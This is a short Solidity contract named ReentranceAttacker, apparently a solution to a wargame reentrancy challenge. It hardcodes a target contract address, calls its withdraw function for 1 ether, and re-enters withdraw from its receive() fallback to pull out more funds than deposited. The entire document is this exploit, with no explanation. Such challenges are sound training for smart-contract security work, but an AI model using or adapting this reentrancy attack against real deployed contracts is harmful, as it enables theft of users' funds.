// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/10_IReentrance.sol";

contract ReentranceAttacker {
  IReentrance reentrance = IReentrance(0xC4c365b8E736934Dd791F16E22fdD9e8Cd218458);
  bool attacking = true;

  function withdraw() public {
    reentrance.withdraw(1 ether);
  }

  receive() external payable {
    if (attacking) {
      withdraw();
    }

    attacking = false;
  }
}